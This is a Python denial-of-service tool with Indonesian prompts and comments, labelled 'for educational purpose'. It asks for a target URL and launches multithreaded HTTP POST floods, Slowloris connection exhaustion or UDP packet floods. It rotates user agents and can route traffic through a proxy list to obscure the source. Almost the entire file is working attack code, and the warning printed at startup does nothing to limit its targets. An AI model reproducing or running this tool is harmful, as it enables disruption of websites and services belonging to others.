import threading
import random
import requests
import time
import sys
import os

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = """
    ╔══════════════════════════════════════╗
    ║           DDoS Attack Tool           ║
    ║        For Educational Purpose       ║
    ╚══════════════════════════════════════╝
    """
    print(banner)

def main():
    clear_screen()
    print_banner()
    
    print("⚠️  PERINGATAN: Hanya untuk testing sistem sendiri!")
    print("=" * 50)
    
    # Konfigurasi
    try:
        url = input("Masukkan URL target: ").strip()
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
            
        threads = int(input("Masukkan jumlah thread (1-1000): "))
        threads = max(1, min(threads, 1000))  # Limit threads
        
        requests_per_thread = int(input("Masukkan jumlah request per thread (1-1000): "))
        requests_per_thread = max(1, min(requests_per_thread, 1000))  # Limit requests
        
        use_proxies = input("Gunakan proxy? (y/n): ").lower() == "y"
        attack_type = input("Pilih metode serangan (http/slowloris/udp): ").lower()
        
    except ValueError:
        print("Error: Masukkan angka yang valid!")
        return
    except KeyboardInterrupt:
        print("\nProgram dihentikan oleh user")
        return

    # Daftar User-Agent acak
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36",
    ]

    # Daftar proxy (jika digunakan)
    proxies = []
    if use_proxies:
        try:
            with open("proxies.txt", "r") as f:
                proxies = [line.strip() for line in f if line.strip()]
            print(f"✓ Loaded {len(proxies)} proxies from proxies.txt")
        except FileNotFoundError:
            print("✗ File proxies.txt tidak ditemukan. Tidak menggunakan proxy.")
            use_proxies = False
            
    # Inisialisasi socket untuk UDP Flood
    if attack_type == "udp":
        import socket
        udp_ip = url.split("//")[1].split("/")[0]  # Extract IP from URL
        udp_port = 80  # Ganti jika port berbeda

    print(f"\n🎯 Target: {url}")
    print(f"🧵 Threads: {threads}")
    print(f"📨 Requests per thread: {requests_per_thread}")
    print(f"🔌 Proxy: {'Yes' if use_proxies else 'No'}")
    print(f"💣 Attack Type: {attack_type}")
    print("=" * 50)
    
    confirm = input("Lanjutkan? (y/n): ").lower()
    if confirm != 'y':
        print("Operasi dibatalkan")
        return

    # Counter untuk request berhasil/gagal
    success_count = 0
    fail_count = 0
    counter_lock = threading.Lock()
    
    # Fungsi untuk HTTP Flood
    def http_flood(thread_id):
        nonlocal success_count, fail_count
        session = requests.Session()
        session.headers.update({"Connection": "keep-alive"})

        for i in range(requests_per_thread):
            try:
                headers = {
                    "User-Agent": random.choice(user_agents),
                    "Cache-Control": "no-cache",
                    "Referer": url,
                }
                data = {"data": "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=1024))}
                
                if use_proxies and proxies:
                    proxy = random.choice(proxies)
                    try:
                        response = session.post(url, headers=headers, data=data, 
                                               proxies={"http": proxy, "https": proxy}, timeout=5)
                        with counter_lock:
                            success_count += 1
                        print(f"✓ Thread {thread_id}: Request {i+1}/{requests_per_thread} - Status: {response.status_code}")
                    except Exception as e:
                        with counter_lock:
                            fail_count += 1
                        print(f"✗ Thread {thread_id}: Request {i+1}/{requests_per_thread} - Proxy failed: {str(e)[:50]}...")
                else:
                    response = session.post(url, headers=headers, data=data, timeout=5)
                    with counter_lock:
                        success_count += 1
                    print(f"✓ Thread {thread_id}: Request {i+1}/{requests_per_thread} - Status: {response.status_code}")
                    
            except Exception as e:
                with counter_lock:
                    fail_count += 1
                print(f"✗ Thread {thread_id}: Request {i+1}/{requests_per_thread} - Error: {str(e)[:50]}...")
            
            time.sleep(0.1)

    # Fungsi untuk Slowloris
    def slowloris(thread_id):
        nonlocal success_count, fail_count
        for i in range(requests_per_thread):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((url.split("//")[1].split("/")[0], 80))  # Ganti port jika perlu
                
                headers = [
                    "GET /?{} HTTP/1.1".format(random.randint(0, 2000)),
                    "User-Agent: {}".format(random.choice(user_agents)),
                    "Accept-language: en-US,en,q=0.5"
                ]
                
                for header in headers:
                    sock.send(header.encode() + b"\r\n")
                
                with counter_lock:
                    success_count += 1
                print(f"✓ Thread {thread_id}: Request {i+1}/{requests_per_thread} - Slowloris sent headers")
                
                # Keep connection alive by sending data slowly
                for j in range(10):
                    time.sleep(1)
                    try:
                        sock.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode())
                    except:
                        sock.close()
                        with counter_lock:
                            fail_count += 1
                        print(f"✗ Thread {thread_id}: Request {i+1}/{requests_per_thread} - Slowloris connection error")
                        break
                sock.close()
                
            except Exception as e:
                with counter_lock:
                    fail_count += 1
                print(f"✗ Thread {thread_id}: Request {i+1}/{requests_per_thread} - Slowloris error: {str(e)[:50]}...")
            
            time.sleep(0.1)

    # Fungsi untuk UDP Flood
    def udp_flood(thread_id):
        nonlocal success_count, fail_count
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        for i in range(requests_per_thread):
            try:
                data = random._urandom(1024)  # Payload acak
                sock.sendto(data, (udp_ip, udp_port))
                with counter_lock:
                    success_count += 1
                print(f"✓ Thread {thread_id}: Request {i+1}/{requests_per_thread} - UDP packet sent")
                
            except Exception as e:
                with counter_lock:
                    fail_count += 1
                print(f"✗ Thread {thread_id}: Request {i+1}/{requests_per_thread} - UDP error: {str(e)[:50]}...")
            
            time.sleep(0.1)

    print("\n🚀 Memulai serangan...")
    start_time = time.time()

    # Membuat dan menjalankan thread
    threads_list = []
    for i in range(threads):
        if attack_type == "http":
            thread = threading.Thread(target=http_flood, args=(i+1,))
        elif attack_type == "slowloris":
            thread = threading.Thread(target=slowloris, args=(i+1,))
        elif attack_type == "udp":
            thread = threading.Thread(target=udp_flood, args=(i+1,))
        else:
            print("Jenis serangan tidak valid!")
            return
            
        threads_list.append(thread)
        thread.start()

    # Menunggu semua thread selesai
    for thread in threads_list:
        thread.join()

    end_time = time.time()
    duration = end_time - start_time
    
    print("\n" + "=" * 50)
    print("📊 SERANGAN SELESAI!")
    print(f"⏱️  Durasi: {duration:.2f} detik")
    print(f"✅ Request berhasil: {success_count}")
    print(f"❌ Request gagal: {fail_count}")
    print(f"📨 Total request: {success_count + fail_count}")
    print("=" * 50)

if __name__ == "__main__":
    main()
